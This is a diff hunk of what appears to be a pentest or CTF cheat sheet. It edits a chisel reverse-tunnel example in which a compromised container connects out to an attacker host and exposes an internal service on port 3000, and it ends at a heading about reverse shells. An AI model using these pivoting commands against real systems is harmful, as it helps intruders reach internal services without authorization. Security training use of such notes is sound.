@@ -23,11 +23,11 @@ ssh -L YOUR_PORT:localhost:PORT_EXPOSED USERNAME@IP_ADDRESS
 ### Using chisel
 To redirect a port (here, 3000) when you're in a docker for example (victim = 172.17.0.1 and your host = 10.10.16.8). Firstly, run a chisel server on your host :
 ```bash
-./chisel server -p 8000 --reverse
+./chisel server -p 5555 --reverse
 ```
 Then, on the docker, redirect to your host from the victim machine :
 ```bash
-./chisel client 10.10.16.8:8000 R:127.0.0.1:8890:172.17.0.1:3000
+./chisel client 10.10.16.8:5555 R:8890:172.17.0.1:3000
 ```
 Then you can access the service with http://localhost:8890/.
 ## Get a proper shell on reverse shell
